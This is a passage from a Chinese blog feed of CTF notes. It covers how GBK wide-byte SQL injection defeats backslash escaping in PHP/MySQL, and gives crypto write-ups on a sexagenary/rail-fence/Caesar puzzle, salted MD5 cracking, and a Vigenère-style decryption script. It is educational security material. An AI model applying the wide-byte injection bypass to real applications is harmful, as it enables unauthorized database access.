href="#0x04-宽字节注入漏洞再深入" class="headerlink" title="0x04 宽字节注入漏洞再深入"></a>0x04 宽字节注入漏洞再深入</h3><p>从宽字节注入漏洞原理可以看出，宽字节注入的关键点有两个：</p><blockquote><p>(1) 设置宽字节字符集；<br>(2) 设置的宽字符集可能吃掉转义符号“\”（对应的编码为0x5c，即低位中包含正常的0x5c就行了）。</p></blockquote><p>理论上，符合第二条的字符集都可能导致宽字节注入漏洞，这里以gbk字符集为典型，介绍宽字符注入漏洞典型案例。<br>宽字节注入漏洞的另一个关键是设置了character_set_client为宽字节字符集，这里有很多中设置的方式，主要包括隐式设置和显式设置。<br>隐含方式设置是指charcter_set_client缺省字符集就是宽字节字符集。<br>显式设置是指在PHP程序中调用相应的设置函数来实现字符集的设置或直接对字符串进行编码转换，设置的函数包括：</p><p>(1) mysql_query，如mysql_query(“SET NAMES ‘gbk’”, $conn)、mysql_query(“setcharacter_set_client = gbk”, $conn)。<br>(2) mysql_set_charset，如mysql_set_charset(“gbk”,$conn)。<br>(3) mb_convert_encoding，如mb_convert_encoding($sql,”utf8”,”gbk”)，将SQL语句从gbk格式转换为utf8格式时，0x5c被吃掉了。<br>(4) iconv，如iconv(‘GBK’, ‘UTF-8’,$sql)，原理同上。</p><p><a href="http://blog.csdn.net/helloweb2014/article/details/60757497" target="_blank" rel="noopener">原文链接</a></p>]]></content>
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧WriteUp合集</title>
      <link href="/2018/01/15/%E5%AE%9E%E9%AA%8C%E5%90%A7Wirteup%E5%90%88%E9%9B%86/"/>
      <url>/2018/01/15/%E5%AE%9E%E9%AA%8C%E5%90%A7Wirteup%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<blockquote><p>本篇博客主要用来记录在实验吧上做的题目的步骤，和一些在做题过程中的体会。此篇博客会持续更新！<br><a id="more"></a></p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><blockquote><ol><li><strong>题目链接:</strong> <a href="http://www.shiyanbar.com/ctf/1991" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1991</a></li><li><strong>题目描述:</strong><br> &emsp;&emsp;小明某一天收到一封密信，信中写了几个不同的年份辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。信的背面还写有“+甲子”，请解出这段密文。</li></ol></blockquote><h4 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>&emsp;&emsp;通过题目名称和描述可知,这是一个与六十甲子有关的题目(传统知识)，并且用到了古典加密。一般这种题应该首先按照题目所给顺序得到六十甲子序号序列。</p><h4 id="0x01-对照六十甲子表"><a href="#0x01-对照六十甲子表" class="headerlink" title="0x01 对照六十甲子表"></a>0x01 对照六十甲子表</h4><div align="center"><br>    <img src="/resources/2018/2018-01-15-00.png" alt="六十甲子顺序表"><br></div><table><thead><tr><th style="text-align:center">辛卯</th><th style="text-align:center">癸巳</th><th style="text-align:center">丙戌</th><th style="text-align:center">辛未</th><th style="text-align:center">庚辰</th><th style="text-align:center">癸酉</th><th style="text-align:center">己卯</th><th style="text-align:center">癸巳</th></tr></thead><tbody><tr><td style="text-align:center">28</td><td style="text-align:center">30</td><td style="text-align:center">23</td><td style="text-align:center">08</td><td style="text-align:center">17</td><td style="text-align:center">10</td><td style="text-align:center">16</td><td style="text-align:center">30</td></tr></tbody></table><h4 id="0x02-“-甲子”"><a href="#0x02-“-甲子”" class="headerlink" title="0x02 “+甲子”"></a>0x02 “+甲子”</h4><p>&emsp;&emsp;这句话的意思是给其序列的每一个序号加一个”甲子”，也就是60年。</p><table><thead><tr><th style="text-align:center">辛卯</th><th style="text-align:center">癸巳</th><th style="text-align:center">丙戌</th><th style="text-align:center">辛未</th><th style="text-align:center">庚辰</th><th style="text-align:center">癸酉</th><th style="text-align:center">己卯</th><th style="text-align:center">癸巳</th></tr></thead><tbody><tr><td style="text-align:center">28</td><td style="text-align:center">30</td><td style="text-align:center">23</td><td style="text-align:center">08</td><td style="text-align:center">17</td><td style="text-align:center">10</td><td style="text-align:center">16</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">88</td><td style="text-align:center">90</td><td style="text-align:center">83</td><td style="text-align:center">68</td><td style="text-align:center">77</td><td style="text-align:center">70</td><td style="text-align:center">76</td><td style="text-align:center">90</td></tr></tbody></table><p>&emsp;&emsp;但是呢，得到这组数又有啥用呢，古典密码学有的只是一串字符啊，咱们可以想想，数字和字符怎么有对应关系呢？于是我们可以想到ASCII</p><table><thead><tr><th style="text-align:center">辛卯</th><th style="text-align:center">癸巳</th><th style="text-align:center">丙戌</th><th style="text-align:center">辛未</th><th style="text-align:center">庚辰</th><th style="text-align:center">癸酉</th><th style="text-align:center">己卯</th><th style="text-align:center">癸巳</th></tr></thead><tbody><tr><td style="text-align:center">28</td><td style="text-align:center">30</td><td style="text-align:center">23</td><td style="text-align:center">08</td><td style="text-align:center">17</td><td style="text-align:center">10</td><td style="text-align:center">16</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">88</td><td style="text-align:center">90</td><td style="text-align:center">83</td><td style="text-align:center">68</td><td style="text-align:center">77</td><td style="text-align:center">70</td><td style="text-align:center">76</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">X</td><td style="text-align:center">Z</td><td style="text-align:center">S</td><td style="text-align:center">D</td><td style="text-align:center">M</td><td style="text-align:center">F</td><td style="text-align:center">L</td><td style="text-align:center">Z</td></tr></tbody></table><h4 id="0x03-解密"><a href="#0x03-解密" class="headerlink" title="0x03 解密"></a>0x03 解密</h4><p><strong>XZSDMFLZ</strong>得到这么一串字符，可是好像没啥规律啊，用<a href="https://github.com/0Chencc/CTFCrackTools-V2" target="_blank" rel="noopener">CTFCrackTools</a>先尝试一下栅栏解密，得到如下结果<br>&emsp;&emsp;得到因数(排除1和字符串长度):<br>&emsp;&emsp;2 4<br>&emsp;&emsp;第1栏：XSMLZDFZ<br>&emsp;&emsp;第2栏：XMZFSLDZ<br>继续用得到的两个字符串分别进行凯撒解密，发现第二个字符串解得的字符串中有一个是有规律的</p><div align="center"><br>    <img src="/resources/2018/2018-01-15-01.png" alt="最后结果"><br></div><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>&emsp;&emsp;此题首先将flag进行凯撒加密，然后又用栅栏加密，将得到的密文中选择了一个进行字符-&gt;ASCII(对应的10进制),又将每项减去60，产生六十甲子序列的序号序列，再转换成六十甲子序列。</p><h3 id="try-them-all"><a href="#try-them-all" class="headerlink" title="try them all"></a>try them all</h3><blockquote><ol><li><strong>题目链接:</strong> <a href="http://www.shiyanbar.com/ctf/1981" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1981</a></li><li><strong>题目描述:</strong><br> &emsp;&emsp;You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password for the ‘admin’ user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password.</li></ol></blockquote><h4 id="0x00-翻译-毕竟英语差，顺便学习学习英语"><a href="#0x00-翻译-毕竟英语差，顺便学习学习英语" class="headerlink" title="0x00 翻译(毕竟英语差，顺便学习学习英语)"></a>0x00 翻译(毕竟英语差，顺便学习学习英语)</h4><p>&emsp;&emsp;大意是:你发现了一个包含了加盐密码的密码文件。一个不受保护的配置文件透漏了这个加盐密码为<strong>5948</strong>，用户“admin”的密码的hash值是<strong>81bdf501ef206ae7d3b92070196f7e98</strong>，尝试用暴力破解破解此密码。</p><h4 id="0x01-解密"><a href="#0x01-解密" class="headerlink" title="0x01 解密"></a>0x01 解密</h4><p>&emsp;&emsp;看样子是MD5加密，拿到<a href="http://www.chamd5.org/" target="_blank" rel="noopener">ChaMD5</a>解密(用的是MD5-32加密的)，得到明文<strong>sniper5948</strong>。题目说用了salt加密，并且加盐密码是<strong>5948</strong>，将它去了就是“admin”用户的密码。</p><h3 id="trivial"><a href="#trivial" class="headerlink" title="trivial"></a>trivial</h3><blockquote><ol><li><strong>题目链接:</strong> <a href="http://www.shiyanbar.com/ctf/1980" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1980</a></li><li><strong>题目描述:</strong><br> An unlocked terminal is displaying the following:<br> Encryption complete, ENC(???,T0pS3cre7key) = Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU<br> <a href="http://ctf5.shiyanbar.com/crypto/trivial/encrypt.rar" target="_blank" rel="noopener">You poke around and find this interesting file.</a></li></ol></blockquote><h4 id="0x00-翻译"><a href="#0x00-翻译" class="headerlink" title="0x00 翻译"></a>0x00 翻译</h4><p>&emsp;&emsp;大意是:一个未锁的终端显示了如下的信息。<br>&emsp;&emsp;加密完成，<strong>ENC(???,T0pS3cre7key) = Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU</strong></p><h4 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h4><p>&emsp;&emsp;可以在上面链接中得到一个压缩包，里面有一个名为<strong>encrypt.py</strong>的python源文件，先来测试一下其功能：</p><div align="center"><br>    <img src="/resources/2018/2018-01-15-02.png" alt="测试功能"><br></div><p><strong>encrypt.py</strong>源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphaL = <span class="string">"abcdefghijklnmopqrstuvqxyz"</span></span><br><span class="line">alphaU = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVQXYZ"</span></span><br><span class="line">num    = <span class="string">"0123456789"</span></span><br><span class="line">keychars = num+alphaL+alphaU</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"Usage: %s SECRET_KEY PLAINTEXT"</span>%(sys.argv[<span class="number">0</span>])  </span><br><span class="line">  sys.exit() </span><br><span class="line"></span><br><span class="line">key = sys.argv[<span class="number">1</span>] </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> key.isalnum(): </span><br><span class="line">  <span class="keyword">print</span> <span class="string">"Your key is invalid, it may only be alphanumeric characters"</span>   </span><br><span class="line">  sys.exit()   </span><br><span class="line"></span><br><span class="line">plaintext = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext)): </span><br><span class="line">  rotate_amount = keychars.index(key[i%len(key)])   </span><br><span class="line">  <span class="keyword">if</span> plaintext[i] <span class="keyword">in</span> alphaL:  </span><br><span class="line">    enc_char = ord(<span class="string">'a'</span>) + (ord(plaintext[i])-ord(<span class="string">'a'</span>)+rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> alphaU: </span><br><span class="line">    enc_char = ord(<span class="string">'A'</span>) + (ord(plaintext[i])-ord(<span class="string">'A'</span>)+rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> num:   </span><br><span class="line">    enc_char = ord(<span class="string">'0'</span>) + (ord(plaintext[i])-ord(<span class="string">'0'</span>)+rotate_amount)%<span class="number">10</span></span><br><span class="line">  <span class="keyword">else</span>:                  </span><br><span class="line">    enc_char = ord(plaintext[i])</span><br><span class="line">  ciphertext = ciphertext + chr(enc_char)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Encryption complete, ENC(%s,%s) = %s"</span>%(plaintext,key,ciphertext)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;经过测试功能，可以分析出源码是怎样对明文进行加密的。<strong>encrypt.py SECRET_KEY PLAINTEXT</strong>(第一个参数是加密文件名，第二个参数是密钥，第三个参数是明文)。<strong>Encryption complete, ENC(mkks,123a) = nmnc</strong>(mkks是明文，123a是密钥，nmnc是密文)。所以根据题目现在知道了密文和密钥，让我们求明文。可以根据加密算法写一段解密的代码(代码是借鉴别人的，本人现在还小白一个)。</p><p>假设pla是b，key是a（即rotate_amount为10），那么根据源代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc_char = ord(<span class="string">'a'</span>) + (ord(plaintext[i])-ord(<span class="string">'a'</span>)+rotate_amount)%<span class="number">26</span></span><br></pre></td></tr></table></figure></p><p>算出来chr(enc_char)为l。换句话来说，从密文换到原文也就是：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc_char = ord(<span class="string">'a'</span>) + (ord(ciphertext[i])-ord(<span class="string">'a'</span>)-rotate_amount)%<span class="number">26</span></span><br></pre></td></tr></table></figure></p><p>把加号换成减号就行。</p><h4 id="0x02-编写解密代码"><a href="#0x02-编写解密代码" class="headerlink" title="0x02 编写解密代码"></a>0x02 编写解密代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphaL = <span class="string">"abcdefghijklnmopqrstuvqxyz"</span></span><br><span class="line">alphaU = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVQXYZ"</span></span><br><span class="line">num    = <span class="string">"0123456789"</span></span><br><span class="line">keychars = num+alphaL+alphaU</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'T0pS3cre7key'</span></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">"Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">  rotate_amount = keychars.index(key[i%len(key)])</span><br><span class="line">  <span class="keyword">if</span> ciphertext[i] <span class="keyword">in</span> alphaL:</span><br><span class="line">    enc_char = ord(<span class="string">'a'</span>) + (ord(ciphertext[i])-ord(<span class="string">'a'</span>)-rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> ciphertext[i] <span class="keyword">in</span> alphaU:</span><br><span class="line">    enc_char = ord(<span class="string">'A'</span>) + (ord(ciphertext[i])-ord(<span class="string">'A'</span>)-rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> ciphertext[i] <span class="keyword">in</span> num:</span><br><span class="line">    enc_char = ord(<span class="string">'0'</span>) + (ord(ciphertext[i])-ord(<span class="string">'0'</span>)-rotate_amount)%<span class="number">10</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    enc_char = ord(ciphertext[i])</span><br><span class="line">  plaintext = plaintext + chr(enc_char)</span><br><span class="line"></span><br><span class="line">print(plaintext)</span><br></pre></td></tr></table></figure><h2 id="安全杂项"><a href="#安全杂项" class="headerlink" title="安全杂项"></a>安全杂项</h2><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
